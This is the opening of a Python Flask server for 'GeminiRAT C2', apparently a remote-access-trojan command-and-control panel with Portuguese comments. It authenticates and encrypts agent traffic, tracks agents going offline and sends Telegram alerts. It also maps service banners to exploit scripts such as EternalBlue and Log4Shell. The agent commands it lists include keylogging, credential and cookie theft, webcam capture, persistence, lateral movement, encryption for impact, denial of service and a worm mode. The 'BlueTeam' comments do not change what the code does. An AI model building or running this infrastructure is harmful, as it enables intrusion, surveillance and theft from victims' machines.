import eventlet
eventlet.monkey_patch()
from eventlet import tpool as _tpool
from pathlib import Path
import sqlite3
from flask import Flask, request, jsonify, render_template, session, redirect, url_for, send_from_directory, Response
from flask_socketio import SocketIO
from datetime import datetime, timedelta
from database import init_db, get_db_connection, check_user_password
import uuid
import requests
import json
import os
import base64
import shutil
import time
import threading
import sys
import logging
import hmac
import subprocess
import re
import shlex
import hashlib
import importlib.util
from flask import send_file
from functools import wraps
from collections import Counter, defaultdict
from dotenv import load_dotenv
from gemini_module import call_gemini_api
from werkzeug.security import generate_password_hash


# --- LOGGING ESTRUTURADO ---
# basicConfig define o handler padrão (stdout) antes de qualquer outra coisa.
# setup_logging() (chamada após _validate_config) adiciona handler de arquivo
# e ajusta o nível via variáveis do .env (LOG_LEVEL, LOG_FILE).
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    stream=sys.stdout
)
logger = logging.getLogger("geminirat")

logger.info("Procurando pelo arquivo .env para carregar a chave da API...")
dotenv_path = os.path.join(os.path.dirname(__file__), '.env')
if os.path.exists(dotenv_path):
    load_dotenv(dotenv_path=dotenv_path)
    logger.info("Arquivo .env encontrado e carregado.")
else:
    logger.warning("Arquivo .env não encontrado. A análise por IA não funcionará.")

# --- VALIDAÇÃO DE CONFIGURAÇÃO OBRIGATÓRIA ---
def _validate_config():
    """Aborta o servidor se variáveis de ambiente críticas estiverem ausentes no .env."""
    required_vars = [
        "SECRET_KEY",
        "C2_PASSWORD",
        "C2_ACCESS_TOKEN",
        "AGENT_SHARED_SECRET",
        "C2_AES_KEY_B64",
        "MOBILE_AGENT_TOKEN",
    ]
    missing = [v for v in required_vars if not os.getenv(v)]
    if missing:
        logger.critical("Variáveis OBRIGATÓRIAS não definidas no .env: %s", ', '.join(missing))
        logger.critical("Servidor recusando iniciar. Adicione as variáveis e reinicie.")
        sys.exit(1)

_validate_config()

def setup_logging():
    """
    Reconfigura o logger com base nas variáveis do .env:
      LOG_LEVEL : DEBUG | INFO (padrão) | WARNING | ERROR | CRITICAL
      LOG_FILE  : caminho do arquivo de log (opcional; omitir = só stdout)

    Por que importa (BlueTeam): logs estruturados com timestamp e nível permitem
    correlacionar eventos em um SIEM (ex: Splunk, Elastic) e detectar padrões
    de ataque (T1078 - Valid Accounts, T1110 - Brute Force) por volume de WARNING/CRITICAL.
    """
    level_str = os.getenv("LOG_LEVEL", "INFO").upper()
    level = getattr(logging, level_str, logging.INFO)
    logger.setLevel(level)

    log_file = os.getenv("LOG_FILE")
    if log_file:
        fh = logging.FileHandler(log_file, encoding='utf-8')
        fh.setLevel(level)
        fh.setFormatter(logging.Formatter(
            '%(asctime)s [%(levelname)s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        ))
        logger.addHandler(fh)
        logger.info("Log em arquivo habilitado: %s", log_file)

setup_logging()

# Origem permitida no CORS do SocketIO - deve ser a URL real do painel em produção.
# Se não definida, restringe a localhost (seguro para dev, inadequado para produção).
C2_PANEL_ORIGIN = os.getenv("C2_PANEL_ORIGIN", "https://panelwhxami.shop")
if not os.getenv("C2_PANEL_ORIGIN"):
    logger.warning("C2_PANEL_ORIGIN não definido no .env - CORS do SocketIO restrito a https://panelwhxami.shop")
    logger.warning("Em produção, defina C2_PANEL_ORIGIN=https://panelwhxami.shop no .env")

# --- Rate limiter in-memory para o endpoint de login ---
_login_attempts: dict = defaultdict(list)
LOGIN_MAX_ATTEMPTS = 10   # máximo de tentativas
LOGIN_WINDOW_SECONDS = 60  # janela de tempo em segundos

def _check_login_rate_limit(ip: str) -> bool:
    """Retorna True se a tentativa for permitida, False se o limite foi atingido."""
    now = time.time()
    _login_attempts[ip] = [t for t in _login_attempts[ip] if now - t < LOGIN_WINDOW_SECONDS]
    if len(_login_attempts[ip]) >= LOGIN_MAX_ATTEMPTS:
        return False
    _login_attempts[ip].append(now)
    return True

# --- IMPORTS DE CRIPTOGRAFIA ---
try:
    from Cryptodome.Cipher import AES
    from Cryptodome.Util.Padding import unpad
    from Cryptodome.Random import get_random_bytes
except ImportError:
    AES = None
    unpad = None
    get_random_bytes = os.urandom  # fallback: os.urandom é compatível para geração de chave
    logger.critical("pycryptodomex não encontrado. Execute: pip install pycryptodomex")

# Inicializa o servidor Flask
app = Flask(__name__, template_folder='templates')
socketio = SocketIO(app, cors_allowed_origins=C2_PANEL_ORIGIN, async_mode='eventlet')

# --- CONFIGURAÇÕES DE SEGURANÇA E AUTENTICAÇÃO ---
# SECRET_KEY vem do .env - nunca gerada em runtime (invalidaria sessões a cada restart)
_cookie_secure_default = C2_PANEL_ORIGIN.lower().startswith('https://')
app.config.update(
    SECRET_KEY=os.getenv("SECRET_KEY"),
    PERMANENT_SESSION_LIFETIME=timedelta(hours=8),
    MAX_CONTENT_LENGTH=int(os.getenv("MAX_CONTENT_LENGTH_BYTES", str(64 * 1024 * 1024))),
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE=os.getenv("SESSION_COOKIE_SAMESITE", "Lax"),
    SESSION_COOKIE_SECURE=os.getenv(
        "SESSION_COOKIE_SECURE", "1" if _cookie_secure_default else "0"
    ).strip().lower() in {"1", "true", "yes", "on"},
)
USERNAME = os.getenv("C2_USERNAME", "admin")
PASSWORD = os.getenv("C2_PASSWORD")                          # sem default
AGENT_SHARED_SECRET_BYTES = os.getenv("AGENT_SHARED_SECRET").encode('utf-8')
C2_ACCESS_TOKEN = os.getenv("C2_ACCESS_TOKEN")              # sem default
MOBILE_AGENT_TOKEN = os.getenv("MOBILE_AGENT_TOKEN").encode('utf-8')
DOWNLOAD_TOKEN = os.getenv("DOWNLOAD_TOKEN", "")  # token para download público de payloads
TIMESTAMP_TOLERANCE = int(os.getenv("TIMESTAMP_TOLERANCE", "300"))  # segundos; aumente em lab com clock drift
TASK_TIMEOUT_SECONDS = int(os.getenv("TASK_TIMEOUT_SECONDS", "300"))  # tasks 'in_progress' por mais de N segundos viram 'timeout'
# AGENT_TIMEOUT_SECONDS é o nome canônico. AGENT_OFFLINE_TIMEOUT continua
# aceito para preservar instalações existentes e passa a usar o mesmo valor.
AGENT_TIMEOUT_SECONDS = max(1, int(os.getenv(
    "AGENT_TIMEOUT_SECONDS",
    os.getenv("AGENT_OFFLINE_TIMEOUT", "300"),
)))
AGENT_OFFLINE_TIMEOUT = AGENT_TIMEOUT_SECONDS
# --- ESTRUTURAS DE DADOS E PERSISTÊNCIA ---
OPERATOR_LOG_FILE = "c2_operator_log.txt"
BASE_DIR      = Path(__file__).parent
KEYLOGS_DIR     = BASE_DIR / 'keylogs'
SYSTEM_LOGS_DIR = BASE_DIR / 'system_logs'
DOWNLOADS_DIR = BASE_DIR / 'downloads'
PAYLOADS_DIR  = BASE_DIR / 'payloads'
EXPLOITS_DIR = Path(__file__).parent / 'exploits'
#agents = {}
#tasks = {}
IPGEOLOCATION_API_KEY = os.getenv("IPGEOLOCATION_API_KEY")

DASHBOARD_UPDATE_INTERVAL = 5  # Intervalo em segundos
last_dashboard_update_time = 0

# --- BANCO DE DADOS DE VULNERABILIDADES ---
# Mapeia uma string de "banner" (identificação do serviço) para o script de exploit correspondente.
VULN_MAP = {
    # Porta 21 - FTP
    "vsFTPd 2.3.4":           "vsftpd_234_backdoor.py",
    "vsftpd 2.3.4":           "vsftpd_234_backdoor.py",
 
    # Porta 445 - SMB / Windows
    "microsoft-ds":            "ms17_010_eternalblue.py",
    "netbios-ssn":             "ms17_010_eternalblue.py",
    "smb":                     "ms17_010_eternalblue.py",
 
    # Porta 6379 - Redis
    "redis":                   "redis_unauth_cron.py",
 
    # Porta 27017 - MongoDB
    "mongodb":                 "mongo_unauth.py",
    "mongod":                  "mongo_unauth.py",
 
    # Porta 8080 / 80 / 443 - HTTP Java (Log4Shell)
    "apache-coyote":           "log4shell.py",
    "spring":                  "log4shell.py",
    "log4j":                   "log4shell.py",
    "jetty":                   "log4shell.py",
    "jboss":                   "log4shell.py",
    "tomcat":                  "log4shell.py",
 
    # Legados (manter compatibilidade)
    "Welcome to Vulnerable Server!": "vulnserver_trun.py",
}

key_buffer = []  
buffer_lock = threading.Lock()
last_window_title = ""
# --- Chave AES-256 ---#
try:
    C2_AES_KEY_B64 = os.getenv("C2_AES_KEY_B64")
    C2_AES_KEY = base64.b64decode(C2_AES_KEY_B64)
    if len(C2_AES_KEY) != 32:
        raise ValueError("A chave AES do .env precisa ter 32 bytes (codificada em Base64).")
except Exception as e:
    logger.critical("Erro ao carregar a chave AES do arquivo .env: %s", e)
    C2_AES_KEY = get_random_bytes(32)
    logger.warning("Usando uma chave AES temporária e volátil. A comunicação com agentes existentes falhará.")
    logger.info("Chave temporária (Base64): %s", base64.b64encode(C2_AES_KEY).decode("utf-8"))


def mobile_auth_required(f):
    """
    Decorator de autenticação por token estático para endpoints de agentes mobile/drone.
    O agente deve enviar o header 'X-Agent-Token' com o valor de MOBILE_AGENT_TOKEN (.env).
    Mais simples que HMAC, adequado para agentes que não implementam assinatura completa.
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        token_header = request.headers.get('X-Agent-Token', '').encode('utf-8')
        if not token_header or not hmac.compare_digest(token_header, MOBILE_AGENT_TOKEN):
            logger.warning("AUTH-FAIL: Endpoint mobile/drone acessado sem token válido de %s", request.remote_addr)
            return jsonify({"error": "Não autorizado"}), 403
        return f(*args, **kwargs)
    return decorated_function


def hmac_required(f):
    """
    Decorator que valida a assinatura HMAC de uma requisição para autenticar o agente.
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # 1. Pega os headers de autenticação enviados pelo agente
        req_timestamp_str = request.headers.get('X-Request-Timestamp')
        req_signature = request.headers.get('X-Signature')

        # Se os headers não existirem, a requisição é inválida.
        if not req_timestamp_str or not req_signature:
            logger.warning("AUTH-FAIL: Requisição de %s sem headers de autenticação. Descartando.", request.remote_addr)
            return jsonify({"error": "Não autorizado"}), 403

        # 2. Valida o timestamp para prevenir que um invasor capture e reenvie um pacote antigo (Replay Attack)
        try:
            req_timestamp = int(req_timestamp_str)
            current_timestamp = int(time.time())
            # Janela configurável via TIMESTAMP_TOLERANCE no .env (padrao 300s)
            if abs(current_timestamp - req_timestamp) > TIMESTAMP_TOLERANCE:
                logger.warning("AUTH-FAIL: Requisição de %s com timestamp expirado. Descartando.", request.remote_addr)
                return jsonify({"error": "Não autorizado"}), 403
        except ValueError:
            return jsonify({"error": "Timestamp inválido"}), 400

        # 3. Recalcula a assinatura no lado do servidor para ver se ela bate
        # Para requisições POST, o corpo (request.data) faz parte da assinatura.
        # Para requisições GET, o corpo está vazio.
        payload_bytes = request.data if request.method in ['POST', 'PUT'] else b''
        
        # O cálculo deve ser EXATAMENTE o mesmo que o agente fez
        message_to_sign = req_timestamp_str.encode('utf-8') + payload_bytes
        server_signature = hmac.new(AGENT_SHARED_SECRET_BYTES, message_to_sign, hashlib.sha256).hexdigest()

        # 4. Compara as assinaturas de forma segura (evita timing attacks)
        if hmac.compare_digest(server_signature, req_signature):
            # SUCESSO! A assinatura bate. A requisição é legítima.
            return f(*args, **kwargs)
        else:
            # FALHA! A assinatura não bate. A requisição é falsa ou foi adulterada.
            logger.warning("AUTH-FAIL: Requisição de %s com assinatura HMAC inválida. Descartando.", request.remote_addr)
            return jsonify({"error": "Não autorizado"}), 403
            
    return decorated_function

def role_required(allowed_roles):
    """
    Decorator que verifica se a role do usuário na sessão está na lista de roles permitidas.
    """
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            # Se o usuário não estiver logado, o @login_required já o terá redirecionado.
            # Mas adicionamos uma checagem extra por segurança.
            if 'role' not in session:
                return jsonify({"error": "Acesso negado. Nenhuma função de usuário encontrada na sessão."}), 403
            
            user_role = session.get('role')
            
            # Verifica se a função do usuário está na lista de funções permitidas para esta rota.
            if user_role not in allowed_roles:
                # Loga a tentativa de acesso não autorizado para auditoria.
                log_system_event(
                    session.get('username'), 
                    "ACCESS_DENIED", 
                    f"Tentativa de acesso à rota restrita. Role necessária: {allowed_roles}, Role do usuário: {user_role}"
                )
                return jsonify({"error": "Acesso negado. Você não tem permissão para executar esta ação."}), 403
            
            # Se a permissão estiver correta, executa a função da rota normalmente.
            return f(*args, **kwargs)
        return decorated_function
    return decorator

# --- SECURITY HEADERS ---
# Adicionados automaticamente a todas as respostas HTTP do painel.
# Por que importa (BlueTeam / OWASP A05:2021 – Security Misconfiguration):
#   X-Frame-Options       → bloqueia clickjacking (MITRE T1185)
#   X-Content-Type-Options → impede MIME sniffing que pode causar XSS em uploads
#   Referrer-Policy       → evita vazar URL interna do C2 em requisições cross-origin
#   Permissions-Policy    → desativa câmera/mic/geolocation via frame (abuso por iframe)
#   Content-Security-Policy → bloqueia scripts inline não autorizados e carregamento
#                             de recursos externos - principal defesa contra XSS persistente
@app.after_request
def set_security_headers(response):
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=()'
    # CSP: permite scripts/estilos apenas da própria origem + CDNs usadas pelo painel
    # CDNs mapeadas dos templates: Tailwind, Socket.IO, Leaflet (unpkg), Notyf (jsdelivr), cdnjs
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com https://cdn.socket.io https://unpkg.com https://cdn.jsdelivr.net; "
        "style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com https://fonts.googleapis.com https://unpkg.com https://cdn.jsdelivr.net; "
        "font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://unpkg.com; "
        "img-src 'self' data: https:; "
        "media-src 'self' data:; "
        "connect-src 'self' ws: wss: https://cdn.socket.io https://unpkg.com https://cdn.jsdelivr.net; "
        "worker-src 'none';"
    )
    return response

# --- TASK STATE MACHINE: SWEEPER DE TIMEOUT ---
def _task_timeout_sweeper():
    """
    Task em background que varre tasks 'in_progress' expiradas e as marca como 'timeout'.
    Roda a cada 60 segundos via socketio.sleep (compatível com eventlet).

    Por que importa (BlueTeam): tasks travadas em 'in_progress' indefinidamente
    indicam que o agente morreu ou perdeu conectividade -- o sweeper mantém o
    estado do banco consistente e permite ao operador saber o que realmente falhou.
    """
    while True:
        socketio.sleep(60)
        try:
            cutoff = (datetime.now() - timedelta(seconds=TASK_TIMEOUT_SECONDS)).isoformat()
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute(
                "SELECT t.id, t.agent_id, t.command, a.hostname FROM tasks t "
                "LEFT JOIN agents a ON a.id = t.agent_id "
                "WHERE t.status = 'in_progress' AND t.timestamp_started IS NOT NULL AND t.timestamp_started < ?",
                (cutoff,)
            )
            expired = cursor.fetchall()
            if expired:
                now_iso = datetime.now().isoformat()
                for row in expired:
                    cursor.execute(
                        "UPDATE tasks SET status = 'timeout', updated_at = ? WHERE id = ?",
                        (now_iso, row['id'])
                    )
                    socketio.emit('task_status_update', {
                        'task_id': row['id'],
                        'agent_id': row['agent_id'],
                        'status': 'timeout'
                    })
                    logger.warning(
                        "[TASK-TIMEOUT] Task %s do agente %s marcada como timeout (>%ds em in_progress).",
                        row['id'], row['agent_id'], TASK_TIMEOUT_SECONDS
                    )
                    if _alert_enabled('timeout'):
                        hostname = row['hostname'] or row['agent_id'][:8]
                        send_telegram_alert(
                            f"<b>GeminiRAT C2</b>\n"
                            f"<b>Task timeout</b>\n"
                            f"Host: <code>{hostname}</code>\n"
                            f"Comando: <code>{row['command']}</code>\n"
                            f"Task ID: <code>{row['id'][:8]}</code>"
                        )
                conn.commit()
            conn.close()
        except Exception as e:
            logger.error("[TASK-TIMEOUT] Erro no sweeper: %s", e)


# --- AGENT HEARTBEAT: SWEEPER DE AUTO-OFFLINE ---
def _agent_heartbeat_sweeper():
    """
    Background task que marca agentes como 'offline' se nao houver checkin
    por mais de AGENT_OFFLINE_TIMEOUT segundos. Roda a cada 60s via
    socketio.sleep (compativel com eventlet).

    Por que importa (BlueTeam): agentes que param de reportar sem transicao
    explicita de status ficam como 'online' para sempre, mascarando perda de
    acesso. O sweeper expoe isso em tempo real no painel e emite
    agent_list_update para todos os clientes conectados.
    """
    while True:
        socketio.sleep(60)
        try:
            cutoff_unix = int(time.time()) - AGENT_OFFLINE_TIMEOUT
            conn = get_db_connection()
            cursor = conn.cursor()
            # Busca agentes que ainda estao marcados como online mas
            # nao fazem checkin ha mais de AGENT_OFFLINE_TIMEOUT segundos.
            # last_seen e gravado em ISO 8601; convertemos via strftime do SQLite.
            cursor.execute(
                """
                SELECT id FROM agents
                WHERE status = 'online'
                  AND last_seen IS NOT NULL
                  AND CAST(strftime('%s', last_seen) AS INTEGER) < ?
                """,
                (cutoff_unix,)
            )
            stale = cursor.fetchall()
            if stale:
                stale_ids = [row['id'] for row in stale]
                # Busca hostname antes de marcar offline para usar no alerta
                hostnames = {}
                if _alert_enabled('offline'):
                    rows_h = conn.execute(
                        f"SELECT id, hostname FROM agents WHERE id IN ({','.join('?'*len(stale_ids))})",
                        stale_ids
                    ).fetchall()
                    hostnames = {r['id']: r['hostname'] or r['id'][:8] for r in rows_h}
                placeholders = ','.join('?' * len(stale_ids))
                cursor.execute(
                    f"UPDATE agents SET status = 'offline' WHERE id IN ({placeholders})",
                    stale_ids
                )
                conn.commit()
                for aid in stale_ids:
                    logger.warning(
                        "[HEARTBEAT] Agente %s marcado como offline (sem checkin por >%ds).",
                        aid, AGENT_OFFLINE_TIMEOUT
                    )
                    if _alert_enabled('offline'):
                        send_telegram_alert(
                            f"<b>GeminiRAT C2</b>\n"
                            f"<b>Agente offline</b>\n"
                            f"Host: <code>{hostnames.get(aid, aid[:8])}</code>\n"
                            f"Sem checkin por &gt;{AGENT_OFFLINE_TIMEOUT}s"
                        )
                socketio.emit('agent_list_update', get_agents_with_status())
            conn.close()
        except Exception as e:
            logger.error("[HEARTBEAT] Erro no sweeper de heartbeat: %s", e)


# --- FUNÇÕES DE AJUDA ---
def setup_directories():
    os.makedirs(DOWNLOADS_DIR, exist_ok=True)
    os.makedirs(KEYLOGS_DIR, exist_ok=True)
    os.makedirs(SYSTEM_LOGS_DIR, exist_ok=True)


# ---------------------------------------------------------------------------
# MAPEAMENTO MITRE ATT&CK
# ---------------------------------------------------------------------------
# Associa comandos do agente a tecnicas MITRE ATT&CK.
# Usado pelo endpoint /api/mitre_stats e pelo dashboard.
MITRE_COMMAND_MAP = {
    'shell':           {'id': 'T1059', 'name': 'Command & Scripting Interpreter', 'tactic': 'Execution'},
    'remote_exec':     {'id': 'T1047', 'name': 'Windows Management Instrumentation', 'tactic': 'Execution'},
    'start_worm_mode': {'id': 'T1203', 'name': 'Exploitation for Client Execution', 'tactic': 'Execution'},
    'sysinfo':         {'id': 'T1082', 'name': 'System Information Discovery',    'tactic': 'Discovery'},
    'processes':       {'id': 'T1057', 'name': 'Process Discovery',               'tactic': 'Discovery'},
    'network_scan':    {'id': 'T1046', 'name': 'Network Service Discovery',       'tactic': 'Discovery'},
    'network_recon':   {'id': 'T1040', 'name': 'Network Sniffing',                'tactic': 'Discovery'},
    'wifi_passwords':  {'id': 'T1040', 'name': 'Network Sniffing',                'tactic': 'Discovery'},
    'screenshot':      {'id': 'T1113', 'name': 'Screen Capture',                  'tactic': 'Collection'},
    'webcam_snap':     {'id': 'T1125', 'name': 'Video Capture',                   'tactic': 'Collection'},
    'keylogger_start': {'id': 'T1056', 'name': 'Input Capture',                   'tactic': 'Collection'},
    'credentials':     {'id': 'T1555', 'name': 'Credentials from Password Stores','tactic': 'Credential Access'},
    'cookies':         {'id': 'T1539', 'name': 'Steal Web Session Cookie',        'tactic': 'Credential Access'},
    'persist':         {'id': 'T1547', 'name': 'Boot or Logon Autostart',         'tactic': 'Persistence'},
    'elevate':         {'id': 'T1548', 'name': 'Abuse Elevation Control Mechanism','tactic': 'Privilege Escalation'},
    'lateral_psexec':  {'id': 'T1021', 'name': 'Remote Services',                 'tactic': 'Lateral Movement'},
    'encrypt':         {'id': 'T1486', 'name': 'Data Encrypted for Impact',       'tactic': 'Impact'},
    'start_attack':    {'id': 'T1498', 'name': 'Network Denial of Service',       'tactic': 'Impact'},
}

# Ordem canonica das taticas ATT&CK para exibicao
MITRE_TACTIC_ORDER = [
    'Execution', 'Discovery', 'Collection',
    'Credential Access', 'Persistence', 'Privilege Escalation',
    'Lateral Movement', 'Impact',
]

# ---------------------------------------------------------------------------
# ALERTAS TELEGRAM
# ---------------------------------------------------------------------------

def _get_setting(key: str, default: str = '') -> str:
    """Lê um valor da tabela c2_settings. Retorna default se nao existir."""
    try:
        conn = get_db_connection()
        row = conn.execute("SELECT value FROM c2_settings WHERE key = ?", (key,)).fetchone()
        conn.close()
        return row['value'] if row else default
    except Exception:
        return default


def _set_setting(key: str, value: str) -> None:
    """Grava/atualiza um valor na tabela c2_settings."""
    conn = get_db_connection()
    conn.execute(
        "INSERT INTO c2_settings (key, value) VALUES (?, ?) "
        "ON CONFLICT(key) DO UPDATE SET value = excluded.value",
        (key, value)
    )
    conn.commit()
    conn.close()


def send_telegram_alert(message: str) -> bool:
    """
    Envia mensagem para o bot Telegram configurado.
    Retorna True se enviado com sucesso, False caso contrario.

    Por que importa (BlueTeam): alertas em tempo real permitem ao defensor
    correlacionar eventos de C2 com logs de SIEM sem precisar manter o painel aberto.
    """
    bot_token = _get_setting('tg_bot_token')
    chat_id   = _get_setting('tg_chat_id')
    if not bot_token or not chat_id:
        return False
    try:
        url  = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        resp = requests.post(url, json={
            'chat_id':    chat_id,
            'text':       message,
            'parse_mode': 'HTML',
        }, timeout=8)
        if not resp.ok:
            logger.warning("[TELEGRAM] Falha ao enviar alerta: %s", resp.text)
        return resp.ok
    except Exception as e:
        logger.warning("[TELEGRAM] Erro ao enviar alerta: %s", e)
        return False


def _alert_enabled(event_key: str) -> bool:
    """Verifica se um evento de alerta esta habilitado nas configuracoes."""
    raw = _get_setting('tg_events', '')
    enabled = [e.strip() for e in raw.split(',') if e.strip()]
    return event_key in enabled
def log_operator_action(operator, command, args):
    """Registra ação de operador no banco de dados (system_logs) e no arquivo legado."""
    args_str = json.dumps(args) if not isinstance(args, str) else args
    # Mantém arquivo legado por compatibilidade durante transição
    try:
        with open(OPERATOR_LOG_FILE, 'a', encoding='utf-8') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] OPERATOR: {operator} | COMMAND: {command} | ARGS: {args_str}\n")
    except Exception as e:
        logger.warning("Falha ao escrever log de operador em arquivo: %s", e)
    # Persiste no banco de dados junto com os outros logs de sistema
    try:
        conn = get_db_connection()
        conn.execute(
            "INSERT INTO system_logs (agent_id, event_type, message, timestamp) VALUES (?, ?, ?, ?)",
            (operator, "OPERATOR_ACTION", f"CMD: {command} | ARGS: {args_str}", datetime.now().isoformat())
        )
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error("Falha ao salvar log de operador no banco: %s", e)

@app.route('/portfolio')
def portfolio_page():
    """Rota pública que exibe a página de portfólio do projeto."""
    return render_template('portfolio.html')


def log_system_event(agent_id, event_type, message):
    """Salva um evento de sistema no banco de dados e emite um evento WebSocket."""
    log_entry_text = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{event_type.upper()}] {str(message)}"
    
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO system_logs (agent_id, event_type, message, timestamp) VALUES (?, ?, ?, ?)",
            (agent_id, event_type.upper(), str(message), datetime.now().isoformat())
        )
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error("Falha ao salvar log de sistema no banco de dados: %s", e)

    # A notificação para o painel continua a mesma, enviando o texto formatado
    socketio.emit('new_system_log', {'agent_id': agent_id, 'log_entry': log_entry_text})


# --- Função de Criptografia --- #
def encrypt_data(plaintext_data: str, key: bytes) -> str:
    """Criptografa dados (str) usando AES-GCM e retorna Base64 (str)."""
    try:
        header = b"GEMINI_C2_DATA" # Header para checagem de sanidade
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(plaintext_data.encode('utf-8'))

        # Estrutura: header(14) + nonce(16) + tag(16) + ciphertext
        encrypted_payload = header + cipher.nonce + tag + ciphertext
        return base64.b64encode(encrypted_payload).decode('utf-8')
    except Exception as e:
        logger.error("Erro ao criptografar: %s", e)
        return ""

def decrypt_data(base64_data: bytes, key: bytes) -> str:
    """Decriptografa Base64 (bytes) usando AES-GCM e retorna (str)."""
    try:
        encrypted_payload = base64.b64decode(base64_data)

        # Checagem de sanidade do header
        if not encrypted_payload.startswith(b"GEMINI_C2_DATA"):
            raise ValueError("Payload inválido ou corrompido (header incorreto)")

        # Desmonta o payload: header(14) + nonce(16) + tag(16) + ciphertext
        header_len = 14
        nonce_len = 16
        tag_len = 16

        nonce = encrypted_payload[header_len : header_len + nonce_len]
        tag = encrypted_payload[header_len + nonce_len : header_len + nonce_len + tag_len]
        ciphertext = encrypted_payload[header_len + nonce_len + tag_len :]

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted_data.decode('utf-8')
    except (ValueError, KeyError, base64.binascii.Error) as e:
        logger.error("Erro ao decriptografar: %s", e)
        return ""



GEO_CACHE_TTL_SECONDS = 30 * 24 * 3600  # 30 dias

def resolve_geo(ip):
    """
    Consulta ipgeolocation.io e retorna dict: {latitude, longitude, city, country}
    (Versão v2 - sem cache, para migração SQL)
    """
    if not ip or not IPGEOLOCATION_API_KEY:
        return None

    # Ignora IPs privados/locais para não gastar chamadas de API
    if any(ip.startswith(p) for p in ["192.168.", "10.", "172.", "127."]):
        return None

    try:
        url = f"https://api.ipgeolocation.io/ipgeo?apiKey={IPGEOLOCATION_API_KEY}&ip={ip}"
        resp = requests.get(url, timeout=5 )
        
        if resp.status_code != 200:
            logger.warning("IPGeo API retornou %s para o IP %s", resp.status_code, ip)
            return None

        js = resp.json()
        lat = float(js.get('latitude')) if js.get('latitude') else None
        lon = float(js.get('longitude')) if js.get('longitude') else None

        if lat is None or lon is None:
            return None

        return {
            "latitude": lat,
            "longitude": lon,
            "city": js.get('city') or None,
            "country": js.get('country_name') or None
        }
    except Exception as e:
        logger.warning("Erro ao resolver geo para %s: %s", ip, e)
        return None



def trigger_dashboard_update():
    """
    Função "inteligente" que só emite a atualização do dashboard se já tiverem
    passado X segundos desde a última atualização, evitando spam de eventos.
    """
    global last_dashboard_update_time
    now = time.time()
    if now - last_dashboard_update_time > DASHBOARD_UPDATE_INTERVAL:
        logger.info("Disparando atualização do dashboard (via trigger)...")
        socketio.emit('dashboard_update', get_dashboard_data_logic())
        last_dashboard_update_time = now


# --- DECORATOR DE AUTENTICAÇÃO ---
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            # Rotas de API retornam JSON, não redirect
            if request.path.startswith('/api/'):
                return jsonify({"error": "Não autenticado."}), 401
            return redirect(url_for('login_route'))
        return f(*args, **kwargs)
    return decorated_function


# --- ROTAS DE AUTENTICAÇÃO E PAINEL ---
@app.route('/login', methods=['GET', 'POST'])
def login_route():
    # Se o usuário já estiver logado, redireciona para a home para evitar confusão
    if 'logged_in' in session:
        return redirect(url_for('home'))

    if request.method == 'POST':
        # --- RATE LIMITING ---
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if client_ip and ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()
        if not _check_login_rate_limit(client_ip):
            logger.warning("AUTH-FAIL: Rate limit atingido para IP %s", client_ip)
            return jsonify({"status": "error", "message": "Muitas tentativas. Aguarde um momento."}), 429

        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "Payload inválido."}), 400

        username = data.get('username')
        password = data.get('password')

        # função que consulta o banco de dados e verifica o hash da senha.
        user = check_user_password(username, password)

        

        if user:
            session.permanent = True  # ativa o timeout de 8h definido em PERMANENT_SESSION_LIFETIME
            session['logged_in'] = True
            session['user_id'] = user['id']
            session['username'] = user['username']
            session['role'] = user['role']


            logger.debug("LOGIN SUCESSO: usuário='%s' role='%s'", user['username'], session['role'])
            
            # auditoria
            log_system_event(user['username'], "LOGIN_SUCCESS", f"Operador '{user['username']}' logado com sucesso.")
            
            return jsonify({"status": "success"})
        else:
            # FALHA: A função check_user_password retornou None.
            # Loga a tentativa de falha para auditoria de segurança.
            log_system_event(username or "desconhecido", "LOGIN_FAIL", f"Tentativa de login falhou para o usuário '{username or 'vazio'}'.")
            
            return jsonify({"status": "error", "message": "Credenciais inválidas."}), 401

    # Se for um método GET, apenas renderiza a página de login.
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()  # limpa toda a sessão, não só 'logged_in'
    return redirect(url_for('login_route'))

def log_unauthorized_access():
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip and ',' in ip:
            ip = ip.split(',')[0].strip()
        user_agent = request.headers.get('User-Agent', 'Desconhecido')
        timestamp  = datetime.now().isoformat()
        log_entry  = f"[{timestamp}] UNAUTHORIZED_ACCESS | IP: {ip} | UA: {user_agent} | PATH: {request.path}\n"
        try:
            with open("unauthorized_log.txt", "a", encoding="utf-8") as f:
                f.write(log_entry)
        except Exception as e:
            logger.warning("Falha ao logar acesso não autorizado: %s", e)

@app.route('/')
def home():
    # --- LÓGICA DE ACESSO UNIFICADA E CORRIGIDA ---

